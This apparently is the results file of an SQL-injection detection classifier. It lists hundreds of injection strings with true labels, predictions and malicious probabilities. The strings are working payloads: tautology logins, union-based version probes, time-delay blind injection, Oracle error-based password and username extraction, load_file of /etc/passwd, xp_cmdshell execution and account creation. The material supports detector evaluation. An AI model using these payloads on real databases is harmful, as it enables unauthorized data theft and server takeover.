Query,Label,predicted,correct,malicious_probability
" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1,1,True,0.9762901754037351
insert,1,0,False,0.08194120190598385
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1,1,True,0.9805063051861319
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,1,True,0.6237475034030359
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
"or 1  =  1 or """"  =  ",1,0,False,0.43793777307270154
/**/or/**/1/**/  =  /**/1,1,1,True,0.9999990260670542
" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1,1,True,0.9727198042142955
" select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1,1,True,0.9967946269482737
" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1,1,True,0.9956960266763596
or 1  =  1/*,1,1,True,0.9038963618082337
%27 or 1  =  1,1,1,True,0.9147388768661013
" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1,1,True,0.9613205577007513
" select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1,1,True,0.9969590127808812
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1,0,False,0.1357976137253287
" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1,1,True,0.9983739143035016
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,1,True,0.9796505290412487
" select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1,1,True,0.9978806263817472
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1,1,True,0.963803959107568
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.977099149419017
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1,1,True,0.999062287866455
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1,1,True,0.9762901754037351
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1,1,True,0.9776310531670696
or 1 --',1,1,True,0.9999664206515392
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
"admin"" or 1  =  1#",1,1,True,0.9999802444013077
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9451818988674049
\x27UNION SELECT,1,1,True,0.9999808400972149
PRINT,1,0,False,0.17750574505706807
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1,1,True,0.9964544468614482
or 1  =  1--,1,1,True,0.9964206657097517
1 or pg_sleep  (  __TIME__  )  --,1,1,True,0.9576952327371169
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
admin'  )   or   (  '1'  =  '1'/*,1,1,True,0.9999999867365945
or 2 between 1 and 3,1,0,False,0.33885557029629215
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,1,True,0.9754892634102325
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1,1,True,0.9688558624391019
admin' or '1'  =  '1,1,1,True,0.9999999540464087
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,1,1,True,0.8745467570159369
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9791936810463112
""" or 0  =  0 --",1,1,True,0.9323989964709042
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1,1,True,0.9529262238927568
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,1,True,0.9792396987158971
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1,1,True,0.898658852585294
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1,1,True,0.9776310531670696
char%4039%41%2b%40SELECT,1,0,False,0.2256484215060855
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
admin'  )   or   (  '1'  =  '1,1,1,True,0.9999999542210453
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1,0,False,0.16670779421460863
"or 0  =  0 #""",1,1,True,0.6459417218828836
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
  )   or   (  'x'  =  'x,1,1,True,0.9824073859714094
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,1,True,0.9503802981797025
$  (  sleep 50  ) ,1,1,True,0.5281087681973221
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9730210476496214
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,1,True,0.9519310264448085
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1,1,True,0.9908058895630337
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1,1,True,0.9832417366242683
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1,1,True,0.9821489349310585
"""a"""" or 1  =  1--""",1,1,True,0.9952795585327112
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.978683488482233
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,True,0.8096952172292723
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1,1,True,0.9964544468614482
1 and user_name  (    )     =   'dbo',1,0,False,0.17914889501632564
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1,1,True,0.9886459712887197
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1,1,True,0.9754420731717811
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1,1,True,0.9688558624391019
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1,1,True,0.9990426671932442
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,1,True,0.9700190644408522
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1,1,True,0.9631333733425402
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1,True,0.606377218171299
or 1  =  1 or ''  =  ',1,1,True,0.9298781478132983
select * from users where id  =  1   or 1  =  1 -- 1,1,1,True,0.9800980831549826
or 'text' > 't',1,0,False,0.38082917440677083
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,1,True,0.9999756680870453
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9866708682731448
admin' or '1'  =  '1'#,1,1,True,0.9999999989186206
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,1,True,0.9720947910648746
s,1,0,False,0.048136499753599064
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,True,0.6221884474452402
 select * from information_schema.tables--,1,1,True,0.9315358875262553
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
1   )    )    or pg_sleep  (  __TIME__  )  --,1,1,True,0.9442693876318801
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,1,True,0.9959093362221442
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1,0,False,0.22242440673296635
 or 1  =  1 or ''  =  ',1,1,True,0.9114099229319321
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,1,True,0.9835282621921697
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1,0,False,0.02002481951067622
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1,1,True,0.9764342805130106
or 'unusual'   =   'unusual',1,0,False,0.24885932386951362
 or 1 in   (  select @@version  )  --,1,1,True,0.9947711178007327
truncate,1,0,False,0.019011103873062023
as,1,0,False,0.11503881262476247
 or 3  =  3 --,1,1,True,0.8565970165719164
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9819233388366508
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,1,True,0.9613205577007513
"admin""  )   or   (  ""1""  =  ""1",1,1,True,0.9996559561542022
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1,1,True,0.9908058895630337
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.7610572893533305
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,1,True,0.9527354425218937
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1,1,True,0.9459139943916939
" or 0  =  0 #""",1,1,True,0.6766781815350822
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,1,True,0.9841105751906225
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,1,True,0.9829896529432662
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1,1,True,0.9880703262979398
1  )   or sleep  (  __TIME__  )  #,1,1,True,0.5909687156110217
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,1,True,0.9768579556755462
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1,1,True,0.898658852585294
select * from users where id  =  1. <@ or 1  =  1 -- 1,1,1,True,0.9777710404611455
 or true--,1,1,True,0.7243100938784061
; execute immediate 'sel' || 'ect us' || 'er',1,1,True,0.7924012676676825
hi' or 'x'  =  'x';,1,1,True,0.997302182778924
select * from users where id  =  1 <@ or 1  =  1 -- 1,1,1,True,0.9792396987158971
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
admin' #,1,1,True,0.9999999904475475
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,1,True,0.9613205577007513
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,1,True,0.9718788122560897
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1,1,True,0.9762901754037351
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,1,True,0.8645045782787625
"""  )  ;waitfor delay '0:0:__TIME__'--",1,1,True,0.9310533600876552
 or 'unusual'   =   'unusual',1,0,False,0.2952655383372089
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,1,True,0.5190965205586429
"admin"" or ""1""  =  ""1""/*",1,1,True,0.9999844870152743
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,1,True,0.9713732416969859
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1,1,True,0.9764342805130106
like,1,0,False,0.07073195747410199
or username like char  (  37  )  ;,1,0,False,0.31388183247518026
 )    )    or pg_sleep  (  __TIME__  )  --,1,1,True,0.9323276021687888
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1,1,True,0.9789820066937749
or 3  =  3,1,0,False,0.05187703197997769
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,1,True,0.9752921109936594
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,1,True,0.9631333733425402
exec sp,1,0,False,0.05785842104351804
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1,1,True,0.9742985628918548
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,1,True,0.9789820066937749
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,1,True,0.9568874890945404
admin' or 1  =  1/*,1,1,True,0.9999993954649768
a' waitfor delay '0:0:10'--,1,1,True,0.9656472129406225
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1,1,True,0.8937013201630232
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,1,True,0.9527354425218937
and 1 in   (  select var from temp  )  --,1,1,True,0.8543492637577058
hi'  )   or   (  'a'  =  'a,1,1,True,0.9710904873021212
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,1,True,0.8277951561827817
"admin"" or 1  =  1",1,1,True,0.9999783417054253
"""  )   or true--",1,1,True,0.6784897088342996
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,1,True,0.9981343371549485
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1,1,True,0.973864367681996
1  )   or pg_sleep  (  __TIME__  )  --,1,1,True,0.9507674568747022
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,1,True,0.9776310531670696
"""  )   or sleep  (  __TIME__  )    =  """,1,0,False,0.29459895924542673
select * from users where id  =  1.<@. or 1  =  1 -- 1,1,1,True,0.9787099655947176
"admin""  )   or   (  ""1""  =  ""1""--",1,1,True,0.9999375329483652
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,1,True,0.9522202343932545
; exec xp_regread,1,1,True,0.5446121255718361
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,1,True,0.992493814669764
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,1,True,0.936224988815715
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
1 and 1  =  1,1,0,False,0.4461007079276648
or 0  =  0 #,1,1,True,0.6459417218828836
union select * from users where login   =   char ...,1,0,False,0.44269132255305893
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,1,True,0.9597597329776488
admin'  )   or '1'  =  '1'--,1,1,True,0.999999998822434
1;SELECT *,1,0,False,0.02530211634996655
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1,1,True,0.9806718001424491
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,1,True,0.9969953119415339
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9978554450944843
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.7744228468987608
procedure,1,0,False,0.026728474224647136
or ''  =  ',1,1,True,0.92583489090041
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1,1,True,0.9090407502898263
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,True,0.593795693047584
\'; desc users; --,1,1,True,0.9963631372361428
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1,1,True,0.9725445054235612
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,1,True,0.998957908955966
""" or """"^""",1,0,False,0.13225650688539672
"""-""",1,0,False,0.048136499753599064
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1,1,True,0.9732554895000317
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,1,True,0.9546991889245953
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1,1,True,0.9581673021037624
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,1,True,0.997169841516128
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
admin'/*,1,1,True,0.9999999930152703
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1,1,True,0.9844790878541877
||UTL_HTTP.REQUEST,1,0,False,0.31998225335147235
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,1,True,0.6129163078313026
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,1,True,0.9937460694602991
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.725429371494786
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1,1,True,0.9613205577007513
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1,1,True,0.9744400505753666
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1,1,True,0.9990918244157369
1 uni/**/on select all from where,1,1,True,0.9906212402713628
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1,1,True,0.9462285817839611
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1,1,True,0.9688558624391019
admin'  )   or '1'  =  '1'#,1,1,True,0.9999999992934432
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1,0,False,0.20178388532159197
or '7659'  =  '7659,1,0,False,0.08141243683280881
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1,1,True,0.9418106345982157
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1,True,0.5580574730941833
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1,1,True,0.9749863244849978
or true--,1,1,True,0.7203612641697765
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,1,True,0.9579451597383393
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1,1,True,0.9969590127808812
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1,1,True,0.9754420731717811
""" or true--",1,1,True,0.7243100938784061
select * from users where id  =  1. or 1  =  1 -- 1,1,1,True,0.9787099655947176
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9668492766832129
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
â or 3  =  3 --,1,1,True,0.8565970165719164
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1,1,True,0.8124415196016619
" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9642535562449458
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1,1,True,0.9756943967280309
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1,1,True,0.906873640885747
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9754911227354338
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1,1,True,0.977473140649661
 or uid like '%,1,0,False,0.3043707534058858
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1,1,True,0.9991273452691499
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1,1,True,0.9963169125397349
23 or 1  =  1; --,1,1,True,0.9893878068634947
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1,1,True,0.9742985628918548
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1,1,True,0.970693968662271
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1,1,True,0.9280190526705956
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1,1,True,0.9969590127808812
0 or 1  =  1,1,1,True,0.6073819198748521
select * from users where id  =  1 &@ or 1  =  1 -- 1,1,1,True,0.9800980831549826
"admin""  )   or ""1""  =  ""1",1,1,True,0.9998386855902929
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1,1,True,0.9756924353514486
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1,True,0.6600166066964323
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1,True,0.7978760103473231
&apos; OR,1,1,True,0.6173822912261002
sqlvuln;,1,0,False,0.03845389475272619
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,1,True,0.9339866656274338
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1,1,True,0.9969493481961311
""" or """"*""",1,0,False,0.13225650688539672
"hi or 1  =  1 --""",1,1,True,0.9922870570841803
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9701441380208146
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,1,True,0.9654944747233836
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9980635468479789
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,1,True,0.9956512190805998
select * from information_schema.tables--,1,1,True,0.9306540690831322
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1,1,True,0.9789820066937749
   (  select top 1,1,0,False,0.1443967717878176
Ã½ or 1  =  1 --,1,1,True,0.9942100124029173
a' --,1,1,True,0.9999725807030874
 or 1  =  1 /*,1,1,True,0.9832601709170995
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1,1,True,0.9675154558066883
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1,1,True,0.9969590127808812
--,1,1,True,0.9999999729321595
"exec sp_addlogin 'name' , 'password'",1,1,True,0.7240732231738729
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9736409800768089
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1,0,False,0.002032351833281171
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1,1,True,0.9749800785128296
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9676676807729571
group by userid having 1  =  1--,1,1,True,0.9409117465916561
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1,1,True,0.906873640885747
select * from users where id  =  1 *1 or 1  =  1 -- 1,1,1,True,0.9787101177537021
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1,1,True,0.9888631922549636
‘ or 1  =  1 --,1,1,True,0.9942100124029173
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1,1,True,0.9581673021037624
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,1,True,0.9803959462719988
or 'a'  =  'a,1,1,True,0.9770651200668917
declare @s varchar  (  22  )   select @s   = ,1,0,False,0.09051692509274613
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,1,True,0.9546991889245953
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,1,True,0.898658852585294
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9754911227354338
@variable,1,0,False,0.16948298269576167
; exec master..xp_cmdshell,1,1,True,0.8807869866255834
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1,1,True,0.933173528127063
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,1,True,0.9553879790810538
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,1,True,0.9553879790810538
